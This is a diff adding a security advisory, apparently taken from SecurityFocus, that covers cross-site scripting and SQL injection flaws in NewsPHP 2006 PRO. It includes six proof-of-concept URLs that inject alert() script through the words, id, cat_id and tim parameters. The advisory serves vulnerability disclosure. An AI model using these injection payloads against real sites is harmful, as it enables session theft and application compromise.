@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/18726/info
+
+NewsPHP 2006 PRO is prone to multiple input-validation vulnerabilities. The issues include cross-site scripting and SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input. 
+
+A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.
+
+http://www.example.com/?words=%3Cscript%3Ealert(/Ellipsis%20Security%20Test/)%3C/script%3E&where=1
+http://www.example.com/index.php?id=%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E
+http://www.example.com/index.php?cat_id=&#039;%3E%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E
+http://www.example.com/index.php?cat_id=Business&tim=%22%3E%3Cscript%3Ealert(%22Ellipsis%20Security%20Test%22)%3C/script%3E
+http://www.example.com/index.php?tim=%22%3E%3Cscript%3Ealert(&#039;Ellipsis%20Security%20Test&#039;)%3C/script%3E
+http://www.example.com/index.php?id=%3Cimg%20src=javascript:alert(%22EllipsisSecuritTest%22)%3E
